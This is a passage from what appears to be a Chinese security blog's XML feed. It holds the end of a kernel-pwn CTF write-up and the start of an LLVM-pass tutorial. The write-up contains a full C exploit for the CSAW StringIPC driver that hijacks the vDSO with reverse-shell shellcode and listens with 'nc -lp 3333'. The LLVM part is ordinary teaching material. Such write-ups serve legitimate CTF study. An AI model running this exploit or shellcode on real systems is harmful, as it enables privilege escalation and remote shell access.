class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;vdso:%lx\n&quot;</span>, addr);</span><br><span class="line"><span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-]cannot get vdso addr&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (memmem((<span class="keyword">char</span> *)addr, <span class="number">0x1000</span>, shellcode, <span class="built_in">strlen</span>(shellcode)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">char</span> *name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!vdso_addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line"><span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">size_t</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffffffff80000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">int</span> offset;</span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">&quot;\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05&quot;</span>;</span><br><span class="line">offset = get_gettimeofday_str_offset();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;gettimeofday str in vdso.so offset=0x%x\n&quot;</span>, offset);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line">prctl(PR_SET_NAME, target);</span><br><span class="line">fd = open(<span class="string">&quot;/dev/csaw&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] open error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] alloc_channel error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] now we get a channel %d\n&quot;</span>, alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span> + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any momery&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (; addr &lt; <span class="number">0xffffffffffffefff</span>; addr += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = addr - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);</span><br><span class="line"><span class="keyword">if</span> ((!<span class="built_in">strcmp</span>(<span class="string">&quot;gettimeofday&quot;</span>, buf + offset)))</span><br><span class="line">&#123;</span><br><span class="line">result = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found vdso %lx\n&quot;</span>, result);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;not found , try again &quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">ioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = result - <span class="number">0x10</span> + <span class="number">0xc80</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = shellcode;</span><br><span class="line">write_args.count = <span class="built_in">strlen</span>(shellcode);</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"><span class="keyword">if</span> (check_vsdo_shellcode(shellcode) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] shellcode is written into vdso, waiting for a reverse shell :&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;gettimeofday\n&quot;</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">void</span> (*gettimeofday_addr)();</span><br><span class="line">gettimeofday_addr = <span class="number">0xc80</span> + getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">gettimeofday_addr();</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;nc -lp 3333&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] someting wrong ... &quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">ioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp使用的shellcode为：<a class="link"   href="https://gist.github.com/itsZN/1ab36391d1849f15b785" >https://gist.github.com/itsZN/1ab36391d1849f15b785<i class="fas fa-external-link-alt"></i></a></p><hr><p>参考链接：<a class="link"   href="http://p4nda.top/2018/11/07/stringipc/#2-%E5%8A%AB%E6%8C%81VDSO" >http://p4nda.top/2018/11/07/stringipc/#2-%E5%8A%AB%E6%8C%81VDSO<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;分析通过内存任意读写到提升权限的三种方式&lt;/p&gt;
&lt;p&gt;在此之前呢，我所写的关于kernel的文章中适用到的提权方式基本都是通过&lt;code&gt;</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="修改cred，劫持vdso" scheme="https://cv196082.gitee.io/tags/%E4%BF%AE%E6%94%B9cred%EF%BC%8C%E5%8A%AB%E6%8C%81vdso/"/>
    
  </entry>
  
  <entry>
    <title>llvm pass pwn</title>
    <link href="https://cv196082.gitee.io/2022/07/27/llvm-pass-pwn/"/>
    <id>https://cv196082.gitee.io/2022/07/27/llvm-pass-pwn/</id>
    <published>2022-07-27T09:44:41.000Z</published>
    <updated>2022-07-27T10:02:30.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h2><p>首先呢，也是同其他博主一样，copy一下百度对于llvm的介绍：</p><p>LLVM是构架编译器的框架系统，以C++编写而成，用于优化以任意程序语言编写的程序的编译时间、链接时间、运行时间以及空闲时间，对开发者保持开放，并兼容已有脚本。</p><p>LLVM PASS是什么：<br>pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/llvm.jpg"                      alt="在这里插入图片描述"                ></p><p>首先我们的源代码会被clang编译器编译成一种中间代码——IR，它连接这编译器的前端和后端，IR的设计很大程度体现着LLVM插件化、模块化的设计哲学，LLVM的各种pass其实都是作用在LLVM IR上的。同时IR也是一个编译器组件接口。通常情况下，设计一门新的编程语言只需要完成能够生成LLVM IR的编译器前端即可，然后就可以轻松使用LLVM的各种编译优化、JIT支持、目标代码生成等功能。</p><h2 id="LLVM-IR"><a href="#LLVM-IR" class="headerlink" title="LLVM IR"></a>LLVM IR</h2><p>LLVM的IR的三种存在形式：</p><ol><li>内存格式，只保存在内存中，人无法看到</li><li>不可读的IR，被称作bitcode，文件后缀为bc</li><li>可读的IR，介于高级语言和汇编代码之间，文件后缀为ll</li></ol><p>大概就是说，LLVM提供了一种中间语言形式，以及编译链接这种语言的后端能力，那么对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力。而LLVM PASS就是去处理IR文件，通过opt利用写好的so库优化已有的IR，形成新的IR。而LLVM PASS类的pwn就是利用这一过程中可能会出现的漏洞。</p><p>从对应格式转化到另一格式的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c  =&gt; .ll: clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c  =&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll =&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc =&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc =&gt; .s : llc a.bc -o a.s</span><br></pre></td></tr></table></figure><p>首先呢，写一个简单的c语言程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">   read(<span class="number">0</span>,name,<span class="number">0x10</span>);</span><br><span class="line">   write(<span class="number">1</span>,name,<span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;wow\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面所给的指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -S test.c -o test.ll</span><br></pre></td></tr></table></figure><p>获得如下内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;test.c&#x27;</span></span><br><span class="line">target datalayout = <span class="string">&quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line">target triple = <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line">@.str = <span class="keyword">private</span> unnamed_addr constant [<span class="number">5</span> x i8] c<span class="string">&quot;wow\0A\00&quot;</span>, align <span class="number">1</span></span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind uwtable</span><br><span class="line">define i32 @main() #<span class="number">0</span> &#123;</span><br><span class="line">  %name = alloca [<span class="number">16</span> x i8], align <span class="number">16</span></span><br><span class="line">  %<span class="number">1</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %name, i32 <span class="number">0</span>, i32 <span class="number">0</span></span><br><span class="line">  %<span class="number">2</span> = call i64 @read(i32 <span class="number">0</span>, i8* %<span class="number">1</span>, i64 <span class="number">16</span>)</span><br><span class="line">  %<span class="number">3</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %name, i32 <span class="number">0</span>, i32 <span class="number">0</span></span><br><span class="line">  %<span class="number">4</span> = call i64 @write(i32 <span class="number">1</span>, i8* %<span class="number">3</span>, i64 <span class="number">16</span>)</span><br><span class="line">  %<span class="number">5</span> = call i32 (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr inbounds ([<span class="number">5</span> x i8], [<span class="number">5</span> x i8]* @.str, i32 <span class="number">0</span>, i32 <span class="number">0</span>))</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare i64 @read(i32, i8*, i64) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">declare i64 @write(i32, i8*, i64) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">declare i32 @<span class="built_in">printf</span>(i8*, ...) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">attributes #<span class="number">0</span> = &#123; nounwind uwtable <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span>=<span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+fxsr,+mmx,+sse,+sse2&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line">attributes #<span class="number">1</span> = &#123; <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span>=<span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+fxsr,+mmx,+sse,+sse2&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">!llvm.ident = !&#123;!<span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line">!<span class="number">0</span> = !&#123;!<span class="string">&quot;clang version 3.8.0-2ubuntu4 (tags/RELEASE_380/final)&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看见中间无论是申请变量还是调用函数还是可以很清晰的看出来的。</p><h2 id="LLVM-PASS"><a href="#LLVM-PASS" class="headerlink" title="LLVM PASS"></a>LLVM PASS</h2><p>官方文档的一个实例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="keyword">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure><p>该示例用于遍历IR中的函数，因此结构体<code>Hello</code>继承了<code>FunctionPass</code>，并重写了<code>runOnFunction</code>函数，那么每遍历到一个函数时，<code>runOnFunction</code>都会被调用，因此该程序会输出函数名。我们需要将其编译为模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared test.cpp -o test.so `llvm-config --ldflags`</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tcdy@ubuntu:~$ opt -load ./test.so -hello ./test.ll</span><br><span class="line">WARNING: You<span class="string">&#x27;re attempting to print out a bitcode file.</span></span><br><span class="line"><span class="string">This is inadvisable as it may cause display problems. If</span></span><br><span class="line"><span class="string">you REALLY want to taste LLVM bitcode first-hand, you</span></span><br><span class="line"><span class="string">can force output with the `-f&#x27;</span> option.</span><br><span class="line"></span><br><span class="line">Hello: main</span><br></pre></td></tr></table></figure><p>上面以我们刚刚的IR为例，-hellow是注册的名字</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>最后打印出来函数名字</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.<span class="built_in">end</span>();</span><br><span class="line">      <span class="keyword">for</span>(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter=F.<span class="built_in">begin</span>(); bbIter!=bbEnd; ++bbIter)&#123;</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;<span class="built_in">begin</span>();</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;<span class="built_in">end</span>();</span><br><span class="line">         <span class="keyword">for</span>(; instIter != instEnd; ++instIter)&#123;</span><br><span class="line">            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;opcode=&quot;</span> &lt;&lt; instIter-&gt;<span class="built_in">getOpcodeName</span>() &lt;&lt; <span class="string">&quot; NumOperands=&quot;</span> &lt;&lt; instIter-&gt;<span class="built_in">getNumOperands</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Hello::ID = <span 